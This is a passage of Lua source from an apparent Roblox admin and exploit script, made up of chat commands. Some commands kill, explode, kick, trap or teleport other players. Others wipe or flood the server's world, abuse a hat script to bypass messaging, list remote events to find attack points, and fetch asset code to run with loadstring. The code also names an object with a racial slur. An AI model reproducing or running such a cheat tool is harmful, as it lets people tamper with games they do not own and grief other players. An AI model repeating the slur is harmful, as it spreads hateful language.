		bodyc.HeadColor = BrickColor.new(color)
		bodyc.LeftArmColor = BrickColor.new(color)
		bodyc.LeftLegColor = BrickColor.new(color)
		bodyc.RightArmColor = BrickColor.new(color)
		bodyc.RightLegColor = BrickColor.new(color)
		bodyc.TorsoColor = BrickColor.new(color)
	end
end)

addcmd('kill', 'kills a player',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
        pchar:BreakJoints()
    end
end)

addcmd('knuckles', 'that dead meme',{'ugandaknuckles'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
spawn(function()
local plr = gPlayers[v]
local  char = plr.Character
char.Humanoid.WalkSpeed = 100
char.Humanoid.JumpPower = 70
spawn(function()
for i,v in pairs(char:GetChildren()) do
    if v:IsA("BasePart") then
        coroutine.wrap(function()
            for i=0,1,.1 do
                wait()
                v.Transparency = v.Transparency +i
            end
        end)()
    end
end
for i,v in pairs(char:GetChildren()) do
    if v:IsA("Accessory") then
        coroutine.wrap(function()
            for i=0,1,.1 do
                wait()
                v.Handle.Transparency = v.Handle.Transparency +i
            end
        end)()
    end
end
end)
char.Head.face:Destroy()
wait(1)
local s = Instance.new("Sound")
s.Name = "wae"
s.SoundId = "http://www.roblox.com/asset/?id=1308281913"
s.Volume = 1
s.Pitch = 1
s.Looped = true
s.archivable = true
s.Parent = gPlayers.LocalPlayer.Character.Head
s:play()
local daqueen = Instance.new("Part",char)
daqueen.Name = "asd"
daqueen.CanCollide = false
local mesh = Instance.new("SpecialMesh",daqueen)
mesh.Scale = Vector3.new(0.1,0.1,0.1)
mesh.MeshId = "rbxassetid://1300136843"
local text = Instance.new("Decal",daqueen)
text.Name = "asd"
text.Texture = "rbxassetid://1300137893"
local knowdawey = Instance.new("Weld",char)
knowdawey.Part0 = char.HumanoidRootPart
knowdawey.Part1 = daqueen
local eye1 = Instance.new("Part")
eye1.CanCollide = false
eye1.Parent = char
local mesh1 = Instance.new("SpecialMesh",eye1)
mesh1.MeshId = "rbxassetid://1300138314"
mesh1.Scale = Vector3.new(0.1,0.1,0.2)
local eyetext = Instance.new("Decal",eye1)
eyetext.Texture = "rbxassetid://1300129774"
local eye1w = Instance.new("Weld",char)
eye1w.Part0 = char.HumanoidRootPart
eye1w.Part1 = eye1
eye1w.C1 = CFrame.new(0,-1.3,0.7)
end)
end
end)

addcmd('delete', 'removes any part with a certain name from the workspace',{'remove'},
function(args, speaker)
	part = GLS(false, 0)
    local function dels(instance)
        for i,v in pairs(instance:GetChildren())do
            if v.Name:lower() == part:lower() then v:Destroy() end
            dels(v)
        end
    end
    dels(workspace)
Notify('Deleted ' ..GLS(false, 0))
end)

addcmd('deleteclass', 'removes any part with a certain classname from the workspace',{'removeclass','deleteclassname','removeclassname','dc'},
function(args, speaker)
	part = GLS(false, 0)
    local function dels(instance)
        for i,v in pairs(instance:GetChildren())do
            if v.ClassName:lower() == part:lower() then v:Destroy() end
            dels(v)
        end
    end
    dels(workspace)
Notify('Deleted items with ClassName ' ..GLS(false, 0))
end)

addcmd('blur', 'adjusts blur',{},
function(args, speaker)
    local function dels(instance)
        for i,v in pairs(instance:GetChildren())do
            if v:IsA'BlurEffect'then v:Destroy()end
            dels(v)
        end
    end
    dels(LightingService)

	local b = Instance.new("BlurEffect", LightingService)
	b.Name = "IYblur"
    b.Size = args[1]
end)

addcmd('distortsound','changes volume of sound',{'distort'},
function(args, speaker)
	for i,v in pairs(workspace:GetChildren())do
		if v:IsA("Sound") and v.Name == "IYsound" then
			v:ClearAllChildren ()
			local d = Instance.new('DistortionSoundEffect')
			d.Parent = v
			d.Level = args[1]
			Notify('Changed distortion to ' .. args[1])
		end
	end
end)

addcmd('volume','changes volume of sound',{'vol'},
function(args, speaker)
	for i,v in pairs(workspace:GetChildren())do
		if v:IsA("Sound") and v.Name == "IYsound" then
			v.Volume = args[1]
			Notify('Changed volume to ' .. args[1])
		end
	end
end)

addcmd('pitch','changes pitch of sound',{},
function(args, speaker)
	for i,v in pairs(workspace:GetChildren())do
		if v:IsA("Sound") and v.Name == "IYsound" then
			v.Pitch = args[1]
			Notify('Changed pitch to ' .. args[1])
		end
	end
end)

addcmd('loadmap', 'spawns a map',{},
function(args, speaker)
local m = args[1]
for _,v in pairs(workspace:GetChildren()) do
if not v:IsA("Terrain") and v ~= workspace.CurrentCamera and not gPlayers:GetPlayerFromCharacter(v) then
v:Destroy() elseif v:IsA("Terrain") then v:Clear() end end
for i,v in pairs(workspace.Terrain:GetChildren()) do v:Destroy() end
wait(1)
local map = game:GetService("InsertService"):LoadLocalAsset("rbxassetid://" .. m)
map.Parent = workspace
end)

addcmd('loadm','loads global messaging',{}, -- global message method by HARKINIAN @ V3RMILLION
function(args, speaker)
msghook()
if MSGhook == false then
local localp = game:GetService'Players'.LocalPlayer
localp.CharacterAppearanceId = 20018
localp.Character:BreakJoints()
repeat wait() until localp.Character:FindFirstChild'BunnyEarsOfCaprice'
Instance.new("ForceField", localp.Character)
repeat wait() until localp.Character.BunnyEarsOfCaprice.Handle:FindFirstChild'BunnyTools'
_G.mainhat = localp.Character:FindFirstChild'BunnyEarsOfCaprice':Clone()
localp.CharacterAppearanceId = 0
localp.Character:BreakJoints()
if _G.mainhat ~= nil then
local main = _G.mainhat.Handle.BunnyTools.EggScript3:Clone()
local part = Instance.new('Part')
part.Anchored = true
part.Transparency = 1
main.Disabled = false
main.Parent = part
_G.mainhat.Handle.BunnyTools.EggMesh3:Clone().Parent = part
part.Parent = localp.Character
part.CFrame = localp.Character.HumanoidRootPart.CFrame
repeat wait() until localp:FindFirstChild'ChessMsg'
part:Destroy()
local message = localp:FindFirstChild'ChessMsg'
message.Text = ''
message.Parent = workspace
message.Name = "IYmessage"
if part ~= nil then part:Destroy() end
localp.Character.HumanoidRootPart.Anchored = false
for _, child in pairs( workspace:GetChildren()) do
    if child.Name == "Part" and child.Size == Vector3.new(8, 0.4, 8) then
        child:Destroy()
    end
end
if localp.Character:FindFirstChild'ForceField' then localp.Character.ForceField:Destroy() end
if _G.msg ~= nil then
Notify('Loaded global message bypass')
else
execCmd("loadm")
end
end
elseif MSGhook == true then
Notify('Messages already loaded!')
end
end)

addcmd('countdown', 'makes a countdown', {},
function(args, speaker)
local players = getPlayer(args[1], speaker)
if args[1] ~= string then
local time = args[1]
msghook()
if MSGhook == true then
local h = workspace.IYmessage
for i = time, 1, -1 do
wait(1)
h.Text = "Countdown: "..i..""
end
wait(1)
h.Text = "Times Up!"
wait(2)
h.Text = ''
elseif MSGhook == false then
	execCmd("loadm")
	repeat wait() until workspace:FindFirstChild("IYmessage")
local h = workspace.IYmessage
for i = time, 1, -1 do
wait(1)
h.Text = "Countdown: "..i..""
end
wait(1)
h.Text = "Times Up!"
wait(2)
h.Text = ''
end
end
end)

addcmd('explode', 'explode a player', {},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i, v in pairs(players) do
        local char = _char(v)
        if char:FindFirstChild("HumanoidRootPart") then
            Instance.new("Explosion", char).Position = char.HumanoidRootPart.Position					
        end
    end
end)

addcmd('flood', 'makes a flood e.e', {},
function(args, speaker)
workspace.Terrain:SetCells(Region3int16.new(Vector3int16.new(-100,-100,-100), Vector3int16.new(100,100,100)), 17, "Solid", "X")
end)

addcmd('spookyify', 'makes it sp00ky', {},
function(args, speaker)
local music = Instance.new("Sound", workspace)
music.SoundId = "http://www.roblox.com/asset/?id=257569267"
music.Volume = 20
music.Looped = true
music:Play()

tex1 = "http://www.roblox.com/asset/?id=185495987"
tex2 = "http://www.roblox.com/asset/?id=260858020"
tex3 = "http://www.roblox.com/asset/?id=149213919"
tex4 = "http://www.roblox.com/asset/?id=171905673"

local w = workspace:GetChildren()

for i= 1,#w do
    if w[i]:isA("BasePart") then
        pe = Instance.new("ParticleEmitter", w[i])
        pe.Texture = tex4
        pe.VelocitySpread = 5
    end
end

local playerLeaderstats = {}
for i, v in pairs(gPlayers:GetChildren()) do
table.insert(playerLeaderstats, v)
end
for i, v in pairs(playerLeaderstats) do
pe = Instance.new("ParticleEmitter",v.Character.HumanoidRootPart)
pe.Texture = "http://www.roblox.com/asset/?id=171905673"
pe.VelocitySpread = 50
end

texture = "http://www.roblox.com/asset/?id=185495987"

local A = workspace:GetChildren()
local B = workspace:GetChildren()
local C = workspace:GetChildren()
local D = workspace:GetChildren()
local E = workspace:GetChildren()
local F = workspace:GetChildren()
for i,v in pairs(A) do
    if v:IsA("Part") then
    local d =    Instance.new("Decal",v)
        v.Decal.Face = "Top"
        v.Decal.Texture = texture
        v.Anchored = true        
    end
end

for i,v in pairs(B) do
    if v:IsA("Part") then
        local s = Instance.new("Decal",v)
        s.Face = "Front"
        s.Texture = texture
    end
end

for i,v in pairs(C) do
    if v:IsA("Part") then
        local h = Instance.new("Decal",v)
        h.Face = "Back"
        h.Texture = texture
    end
end

for i,v in pairs(D) do
    if v:IsA("Part") then
        local j = Instance.new("Decal",v)
        j.Face = "Left"
        j.Texture = texture
    end
end

for i,v in pairs(E) do
    if v:IsA("Part") then
        local k = Instance.new("Decal",v)
        k.Face = "Right"
        k.Texture = texture
    end
end

for i,v in pairs(F) do
    if v:IsA("Part") then
        local l = Instance.new("Decal",v)
        l.Face = "Bottom"
        l.Texture = texture
    end

	imageOne = "http://www.roblox.com/asset/?id=169585459"
imageTwo = "http://www.roblox.com/asset/?id=169585475"
imageThree = "http://www.roblox.com/asset/?id=169585485"
imageFour = "http://www.roblox.com/asset/?id=169585502"
imageFive = "http://www.roblox.com/asset/?id=169585515"
imageSix = "http://www.roblox.com/asset/?id=169585502"
imageSeven = "http://www.roblox.com/asset/?id=169585485"
imageEight = "http://www.roblox.com/asset/?id=169585475"

Spooky = Instance.new("Sound", workspace)
Spooky.Name = "Spooky"
Spooky.SoundId = "rbxassetid://174270407"
Spooky.Volume = 15
Spooky.Looped = true
Spooky:Play()

Sky = Instance.new("Sky", LightingService)
Sky.SkyboxBk = imageOne
Sky.SkyboxDn = imageOne
Sky.SkyboxFt = imageOne
Sky.SkyboxLf = imageOne
Sky.SkyboxRt = imageOne
Sky.SkyboxUp = imageOne


while true do
    Sky.SkyboxBk = imageOne
    Sky.SkyboxDn = imageOne
    Sky.SkyboxFt = imageOne
    Sky.SkyboxLf = imageOne
    Sky.SkyboxRt = imageOne
    Sky.SkyboxUp = imageOne
    wait(0.15)
    Sky.SkyboxBk = imageTwo
    Sky.SkyboxDn = imageTwo
    Sky.SkyboxFt = imageTwo
    Sky.SkyboxLf = imageTwo
    Sky.SkyboxRt = imageTwo
    Sky.SkyboxUp = imageTwo
    wait(0.15)
    Sky.SkyboxBk = imageThree
    Sky.SkyboxDn = imageThree
    Sky.SkyboxFt = imageThree
    Sky.SkyboxLf = imageThree
    Sky.SkyboxRt = imageThree
    Sky.SkyboxUp = imageThree
    wait(0.15)
    Sky.SkyboxBk = imageFour
    Sky.SkyboxDn = imageFour
    Sky.SkyboxFt = imageFour
    Sky.SkyboxLf = imageFour
    Sky.SkyboxRt = imageFour
    Sky.SkyboxUp = imageFour
    wait(0.15)
    Sky.SkyboxBk = imageFive
    Sky.SkyboxDn = imageFive
    Sky.SkyboxFt = imageFive
    Sky.SkyboxLf = imageFive
    Sky.SkyboxRt = imageFive
    Sky.SkyboxUp = imageFive
    wait(0.15)
    Sky.SkyboxBk = imageSix
    Sky.SkyboxDn = imageSix
    Sky.SkyboxFt = imageSix
    Sky.SkyboxLf = imageSix
    Sky.SkyboxRt = imageSix
    Sky.SkyboxUp = imageSix
    wait(0.15)
    Sky.SkyboxBk = imageSeven
    Sky.SkyboxDn = imageSeven
    Sky.SkyboxFt = imageSeven
    Sky.SkyboxLf = imageSeven
    Sky.SkyboxRt = imageSeven
    Sky.SkyboxUp = imageSeven
    wait(0.15)
    Sky.SkyboxBk = imageEight
    Sky.SkyboxDn = imageEight
    Sky.SkyboxFt = imageEight
    Sky.SkyboxLf = imageEight
    Sky.SkyboxRt = imageEight
    Sky.SkyboxUp = imageEight
    wait(0.15)
    
end
end
end)

addcmd('invisible', 'make a player invisible',{'invis'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i, v in pairs(players) do
        for k, v2 in pairs(_char(v):GetChildren()) do
			if v2.className == "Part" then
                if v2.Name ~= "HumanoidRootPart" then v2.Transparency = 1 end
            elseif v2.className == "Accessory" then
                if v2:FindFirstChild("Handle") then
                    v2.Handle.Transparency = 1 
                end
			end
            if v2:FindFirstChild("face") then
                v2.face.Transparency = 1
			end
		end
    end
end)

addcmd('visible', 'make a player visible',{'vis'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i, v in pairs(players) do
        for k, v2 in pairs(_char(v):GetChildren()) do
            if v2.className == "Part" then
				if v2.Name ~= "HumanoidRootPart" then v2.Transparency = 0 end elseif v2.className == "Accessory" then
                if v2:FindFirstChild("Handle") then v2.Handle.Transparency = 0 end
            end
			if v2:FindFirstChild("face") then
				v2.face.Transparency = 0
			end
		end
    end
end)

addcmd('goto', 'go to a player',{'to'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	if _char(players[1]) ~= nil then
		if speaker.Character:FindFirstChild("Humanoid") then
			speaker.Character.Humanoid.Jump = true
		end
		speaker.Character:MoveTo(_char(players[1]).HumanoidRootPart.Position)
	end
end)

addcmd('bring', 'bring a player to you',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		if _char(v) ~= nil then
			if _char(v):FindFirstChild("Humanoid") then
			_char(v).Humanoid.Jump = true
			_char(v):MoveTo(speaker.Character.HumanoidRootPart.Position)
			end
			wait(0.1)
			_char(v):MoveTo(speaker.Character.HumanoidRootPart.Position)
		end
	end
end)

addcmd('tp', 'teleport player 1 to player 2',{},
function(args, speaker)
    local players1=getPlayer(args[1], speaker)
    local players2=getPlayer(args[2], speaker)
    if not players2[1] then return end
    for i,v in pairs(players1) do
		if _char(v) ~= nil and _char(players2[1]) ~= nil then
			if _char(v):FindFirstChild("Humanoid") then
			_char(v).Humanoid.Jump = true
			_char(v):MoveTo(_char(players2[1]).HumanoidRootPart.Position)
			end
			wait(0.1)
			_char(v):MoveTo(_char(players2[1]).HumanoidRootPart.Position)
		end		
	end
end)

local WayPoints = {}
addcmd("savepos","sets a waypoint at the speaker's position",{'spos'},
function(args, speaker)
	local WPName = tostring(GLS(false, 0))
	if speaker.Character:findFirstChild("HumanoidRootPart") then
		Notify("Created waypoint: "..GLS(false, 0))
		local torso = speaker.Character:findFirstChild("HumanoidRootPart")
		WayPoints[#WayPoints + 1] = {NAME = WPName, COORD = {math.floor(torso.Position.X), math.floor(torso.Position.Y), math.floor(torso.Position.Z)}}
		updatepositions()
	end	
end)

addcmd("deletepos","sets a waypoint at the speaker's position",{'dpos'},
function(args, speaker)
		for i,v in pairs(WayPoints) do
		if v.NAME == tostring(GLS(false, 0)) then
		Notify("Deleted waypoint: " .. v.NAME)
		table.remove(WayPoints, i)
		updatepositions()
		end end
end)


addcmd("loadpos","teleports a player to a waypoint",{'lpos'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
		local WPName = tostring(GLS(false, 1))
		for i,v in pairs(players) do
		if gPlayers[v] and gPlayers[v].Character then
			for i,_ in pairs(WayPoints) do
				local x = WayPoints[i].COORD[1]
				local y = WayPoints[i].COORD[2]
				local z = WayPoints[i].COORD[3]
				if tostring(WayPoints[i].NAME) == tostring(WPName) then
					gPlayers[v].Character.HumanoidRootPart.CFrame = CFrame.new(x,y,z)
				end
			end
		end
	end
end)

addcmd('charplr','charplr [plr] [plr]',{'cp'},
function(args, speaker)
    local players1, players2 = getPlayer(args[1], speaker), getPlayer(args[2], speaker)
    for i,v in pairs(players1) do for a,b in pairs(players2) do
            if _players[v].Character and _players[b].Character then
                _players[v].CharacterAppearanceId = _players[b].userId
                refresh(_players[v])
            end
        end
    end
end)

addcmd('copytools', 'copys the tools from a players backpack',{'ctools','clonetools'},
function(args, speaker)
    local players1, players2 = getPlayer(args[1], speaker), getPlayer(args[2], speaker)
	for i,v in pairs(players1) do for a,b in pairs(players2) do
		spawn(function()
		for i,v in pairs(_players[v].Backpack:GetChildren()) do
			if v:IsA('Tool') or v:IsA('HopperBin') then
				if not _players[b] then
				v:Clone().Parent = speaker.Backpack
				else v:Clone().Parent = _players[b].Backpack
			end
			end
		end
		end)
		end
		end
end)

addcmd('char', 'change a players appearance',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    if not args[1]or not args[2]then return end
    local id=args[2]
	if players ~= nil then
		for i,v in pairs(players) do
			gPlayers[v].CharacterAppearanceId = id
			refresh(gPlayers[v])
			end
		end
end)

addcmd('unchar', 'change a players appearance to default',{'nochar','uncp','nocp','uncharplr','nocharplr'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	if players ~= nil then
		for i,v in pairs(players) do
		gPlayers[v].CharacterAppearanceId = 0
		refresh(gPlayers[v])
		end
	end
end)

addcmd('speed', 'change a players walkspeed',{'ws'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    if not args[1]or not args[2]then return end
    local num=args[2]
	for i,v in pairs(players) do
		if _char(v):FindFirstChild("Humanoid") then
			_char(v).Humanoid.WalkSpeed=tonumber(num)
		end
	end
end)

addcmd('jump', 'forces a player to jump',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		if _char(v):FindFirstChild("Humanoid") then
			_char(v).Humanoid.Jump = true
		end
	end
end)

jumping = {}
addcmd('loopjump','like a bunny :)',{'ljump'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
		if FindTable(jumping, _players[v].Name) then return end
		table.insert(jumping, _players[v].Name)
		repeat wait(0.01)
			if _players[v].Character ~= nil and _players[v].Character:FindFirstChild("Humanoid") then
			if _players[v].Character.Humanoid.Jump ~= true then
		_players[v].Character.Humanoid.Jump = true end end
		until not FindTable(jumping, _players[v].Name)
	end)
	end
end)

addcmd('unljump','unjails player',{'noljump','unloopjump','noloopjump'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
		for a,b in pairs(jumping) do if b == _players[v].Name then table.remove(jumping, a) end end
		end)
		end
end)

addcmd('sit', 'sit a player',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		if _char(v):FindFirstChild("Humanoid") then
			_char(v).Humanoid.Sit = true
		end
	end
end)

sitting = {}
addcmd('loopsit','very annoying',{'lsit'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
		if FindTable(sitting, _players[v].Name) then return end
		table.insert(sitting, _players[v].Name)
		repeat wait(0.01)
			if _players[v].Character ~= nil and _players[v].Character:FindFirstChild("Humanoid") then
			if _players[v].Character.Humanoid.Sit ~= true then
		_players[v].Character.Humanoid.Sit = true end end
		until not FindTable(sitting, _players[v].Name)
	end)
	end
end)

addcmd('unlsit','unjails player',{'nolsit','unloopsit','noloopsit'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
		for a,b in pairs(sitting) do if b == _players[v].Name then table.remove(sitting, a) end end
		end)
		end
end)

addcmd('strength',' strong',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
	for _, child in pairs( _players[v].Character:GetDescendants()) do
    if child.ClassName == "Part" then
    child.CustomPhysicalProperties = PhysicalProperties.new(100, 0.3, 0.5)
    end
	end
	end)
	end
end)

addcmd('weaken',' weak',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
	for _, child in pairs( _players[v].Character:GetDescendants()) do
    if child.ClassName == "Part" then
    child.CustomPhysicalProperties = PhysicalProperties.new(0, 0.3, 0.5)
    end
	end
	end)
	end
end)

addcmd('unweaken',' undoes strength and weaken',{'unstrength'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
	for _, child in pairs( _players[v].Character:GetDescendants()) do
    if child.ClassName == "Part" then
    child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
    end
	end
	end)
	end
end)

addcmd('trip','makes a player trip',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
	if _players[v].Character:findFirstChild("Right Leg") then -- credz to Zwolf#3762
	local dir = _players[v].Character:findFirstChild("Right Leg")
	dir.Anchored = true
	if dir.Anchored == true then
    wait(.5)
    _players[v].Character.Humanoid.Sit = true
    wait(1)
    _players[v].Character.Humanoid.Sit = false
    dir.Anchored = false
	end
	end
	end)
	end
end)

oofing = false
addcmd('loopoof','very VERY annoying',{},
function(args, speaker)
oofing = true
repeat wait(0.01)
	for i,v in pairs(game:GetService'Players':GetPlayers()) do
       if v.Character ~= nil and v.Character:FindFirstChild'Head' then
           for _,x in pairs(v.Character.Head:GetChildren()) do
               if x:IsA'Sound' then x.Playing = true end
           end
       end
   end
until oofing == false
end)

addcmd('unloopoof','stops the oof chaos',{},
function(args, speaker)
oofing = false
end)

addcmd('jpower', 'change a players jump height',{'grav','jumppower','jp'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    if not args[1]or not args[2]then return end
    local num=args[2]
	for i,v in pairs(players) do
		if _char(v):FindFirstChild("Humanoid") then
			_char(v).Humanoid.JumpPower=tonumber(num)
		end
	end
end)

addcmd('confuse', 'confusing...',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		spawn(function()
		if _char(v):FindFirstChild("Humanoid") then
			_char(v).Humanoid.Name = "ConfusedNigga"
			while true do
			_char(v).ConfusedNigga.CameraOffset = Vector3.new(2, 4, 6)
    		_char(v).ConfusedNigga.WalkToPoint = Vector3.new(math.random(1,100), math.random(1,100), math.random(1,100))
   			wait(0.1)
			end 

		end
		end)
		end
	end)

addcmd('unconfuse', 'not confusing...',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		spawn(function()
		if _char(v):FindFirstChild("ConfusedNigga") then
			_char(v).ConfusedNigga.Name = "Humanoid"
			wait(0.3)
			_char(v).Humanoid.CameraOffset = Vector3.new(0, 0, 0)

		end
		end)
		end
end)

addcmd('cripple', 'cripples a player xddd',{'stun'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		if _char(v):FindFirstChild("Humanoid") then
			_char(v).Humanoid.PlatformStand = true
		end
	end
end)

addcmd('uncripple', 'un cripples a player xddd',{'unstun'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		if _char(v):FindFirstChild("Humanoid") then
			_char(v).Humanoid.PlatformStand = false
		end
	end
end)

addcmd('hipheight', 'adjusts hip height',{'hheight'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		if _char(v):FindFirstChild("Humanoid") then
			_char(v).Humanoid.HipHeight = args[2]
		end
	end
end)

addcmd('face', 'change a players face',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		if _char(v).Head:FindFirstChild("face") then
			_char(v).Head.face.Texture = "rbxassetid://" .. args[2]
		end
	end
end)

addcmd('time', 'change the time of day',{},
function(args, speaker)
    if not args[1]then return end
	Notify('Time set to ' .. args[1])
    LightingService.ClockTime = args[1]
end)

addcmd('day', 'change the time to day',{},
function(args, speaker)
LightingService.ClockTime = 15
end)

addcmd('night', 'change the time of night',{},
function(args, speaker)
LightingService.ClockTime = 0
end)

addcmd('globalshadows', 'changes the lighting property',{'gshadows'},
function(args, speaker)
	Notify('Turned on global shadows')
    LightingService.GlobalShadows = true
end)

addcmd('unglobalshadows', 'changes the lighting property',{'nogshadows','ungshadows','noglobalshadows'},
function(args, speaker)
	Notify('Turned off global shadows')
    LightingService.GlobalShadows = false
end)

addcmd('outlines', 'changes the lighting property',{},
function(args, speaker)
	Notify('Turned on outlines')
    LightingService.Outlines = true
end)

addcmd('unoutlines', 'changes the lighting property',{'nooutlines'},
function(args, speaker)
	Notify('Turned off outlines')
    LightingService.Outlines = false
end)

addcmd('brightness', 'changes the lighting property',{},
function(args, speaker)
	Notify('Set brightness to ' .. args[1])
    LightingService.Brightness = args[1]
end)

addcmd('age','tells you the age of a player',{},
function(args, speaker)
local players = getPlayer(args[1], speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
for i,v in pairs(players) do
game:FindService('StarterGui'):SetCore('SendNotification', {
Title = _players[v].Name,
Text = 'Age: '.._players[v].AccountAge,
Icon = [[http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userName=]].._players[v].Name..[[&RAND]] .. math.random(1,100000000),
Duration = 5,
})
end
end
end)

addcmd('remotespy', 'prints remotes',{'remotes'},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
Notify('Printing remotes')
function getem(o)
for i,v in pairs(o:children())do
if string.match(v.ClassName, "RemoteEvent") or string.match(v.ClassName, "RemoteFunction") then              
print("Name: "..v.Name.." | ".."Type: "..v.ClassName.." | ".."Location: ".."game."..v:GetFullName())
end
getem(v)
end
end
pcall(getem,game)
end
end)

addcmd('f3x', 'loads f3x tools',{'fex'},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
end
end)

addcmd('kick', 'kick a player',{},
function(args, speaker)
local players = getPlayer(args[1], speaker)
for i,v in pairs(players) do
spawn(function()
if FindTable(SPC, args[1]) then Notify('Kicked ' ..args[1]) else
Notify('Kicked player(s)') end
kickF(gPlayers[v])
end) end end)

function fadelock(id)
if lockic.ImageTransparency ~= 1 then
for i=1, 10 do   	
   lockic.ImageTransparency = lockic.ImageTransparency + 0.1
wait(0.01)
end
lockic.ImageTransparency = 1
end
if id ~= 'off' then
lockic.Image = id
wait(0.2)
for i=1, 10 do   	
   lockic.ImageTransparency = lockic.ImageTransparency - 0.1
wait(0.01)
end
lockic.ImageTransparency = 0
end end

addcmd('serverlock', 'lock teh server',{'slock'},
function(args, speaker)
slock = true
agelock = false
Notify('Locked Server')
fadelock("rbxassetid://1495252742")
end)

addcmd('unserverlock', 'unlock teh server',{'unslock'},
function(args, speaker)
slock = false
Notify('Unlocked Server')
if lockic.Image == "rbxassetid://1495252742" then
fadelock('off')
end
end)

addcmd('agelock', 'lock teh server for a certain age',{'alock'},
function(args, speaker)
if isNumber(args[1]) then
Notify('Set the age lock to age ' .. args[1])
isagelocked = true
slock = false
agelock = tonumber(args[1])
fadelock("rbxassetid://1495252495")
end
end)

addcmd('unagelock', 'lock teh server for a certain age',{'unalock','noagelock','noalock'},
function(args, speaker)
Notify('Disabled age lock')
isagelocked = false
if lockic.Image == "rbxassetid://1495252495" then
fadelock('off')
end
end)

addcmd('unlockws', 'unlock the whole workspace',{},
function(args, speaker)
	Notify('Workspace unlocked')
	wait(1)
    local function unlock(instance) 
        for i,v in pairs(instance:GetChildren()) do
            if v:IsA("BasePart") then
                v.Locked = false
            end
            unlock(v)
        end
    end
    unlock(workspace)
end)

addcmd('lockws', 'lock the whole workspace',{},
function(args, speaker)
	Notify('Workspace locked')
	wait(1)
    local function lock(instance) 
        for i,v in pairs(instance:GetChildren()) do
            if v:IsA("BasePart") then
                v.Locked = true
            end
            lock(v)
        end
    end
    lock(workspace)
end)

addcmd('unanchorws', 'unanchor the whole workspace',{'unanchor', 'unanchr'},
function(args, speaker)
   local function unanchor(instance) 
        for i,v in pairs(instance:GetChildren()) do
            if v:IsA("BasePart") then
                v.Anchored=false
            end
            unanchor(v)
        end
    end
    unanchor(workspace)
end)

addcmd('anchorws', 'anchor the whole workspace',{'anchor'},
function(args, speaker)
   local function anchor(instance) 
        for i,v in pairs(instance:GetChildren()) do
            if v:IsA("BasePart") then
                v.Anchored=true
            end
            anchor(v)
        end
    end
    anchor(workspace)
end)

addcmd('clear', 'resets Workspace to a baseplate',{'clearws','clearworkspace'},
function()
	for _,v in pairs(workspace:GetChildren()) do
		if not v:IsA("Terrain") and v ~= workspace.CurrentCamera and not gPlayers:GetPlayerFromCharacter(v) then
			v:Destroy()
		elseif v:IsA("Terrain") then
			v:Clear()
		end
	end
	for i,v in pairs(workspace.Terrain:GetChildren()) do v:Destroy() end
	local p = Instance.new("Part", workspace)
	p.Anchored = true
	p.FormFactor = "Symmetric"
	p.Size = Vector3.new(1000,1,1000)
	p.Position = Vector3.new(0,0,0)
	p.BrickColor = BrickColor.new("Bright green")
	p.Material = "Grass"
	p.Locked = true
end)

addcmd('headshake', 'shakes a players head',{},
function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
				spawn(function()
local shaken = gPlayers[v].Character
for X = 1, math.huge, 0.2 do 
wait() 
shaken.Torso.Neck.C0 = CFrame.new(math.sin(X) / 1,1.5,0) 
shaken.Torso.Neck.C1 = CFrame.new(0,0,0) 
end 
for X = 1, math.huge, 0.1 do 
wait() 
shaken.Torso.Neck.C0 = CFrame.new(0,1.5,0) * CFrame.fromAxisAngle(Vector3.new(0,1,0), X) 
shaken.Torso.Neck.C1 = CFrame.new(0,0,0) 
end 
for _,c in pairs(gPlayers:GetChildren()) do
	c.Character.Head.Mesh.Scale = Vector3.new(100, 100, 100)
end
for _,c in pairs(gPlayers:GetChildren()) do
	c.Character.Head.Mesh.Scale = Vector3.new(1.25, 1.25, 1.25)
end
end)
end
end)

addcmd('explorer', 'opens DEX',{'dex'},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
